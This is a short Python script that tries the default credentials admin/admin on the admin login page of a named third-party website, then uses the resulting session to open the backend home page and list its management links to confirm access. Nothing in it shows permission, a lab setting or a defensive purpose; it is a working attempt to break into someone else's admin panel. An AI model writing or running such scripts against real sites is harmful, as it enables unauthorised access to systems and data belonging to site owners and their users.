#!/usr/bin/env python3
"""zhongshengjinshuzhipin.com - verify admin/admin login + explore backend"""
import urllib.request, urllib.parse, re, http.cookiejar

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
HOST = "http://zhongshengjinshuzhipin.com"

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, url, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, url, str(ex)

op, cj = get_opener()
# 1. GET login page
code, final, body = fetch(op, HOST + "/admin/login.php")
if code != 200:
    code, final, body = fetch(op, HOST + "/admin/")
print("login page: %s size=%d final=%s" % (code, len(body), final[:50]))
# find fields + form action
action = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', body, re.I)
print("form action:", action.group(1) if action else "?")
fields = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', body)
print("fields:", fields)

# 2. POST login admin/admin
data = urllib.parse.urlencode({"username": "admin", "password": "admin", "verify": ""})
code, final, body = fetch(op, HOST + "/admin/", data=data, referer=HOST + "/admin/")
print("login: code=%s final=%s size=%d" % (code, final[:60], len(body)))

# 3. access admin home with session
code, final, body = fetch(op, HOST + "/admin/index.php", referer=HOST + "/admin/")
print("admin home: code=%s size=%d final=%s" % (code, len(body), final[:60]))
title = re.search(r"<title>([^<]*)</title>", body, re.I)
print("title:", title.group(1)[:50] if title else "?")
# menu links
links = re.findall(r'href=["\']([^"\']*(?:admin|manage|system|user|content)[^"\']*)["\']', body, re.I)
print("menu links:", sorted(set(links))[:15])
# is logged in?
print("has logout:", "退出" in body or "logout" in body.lower())
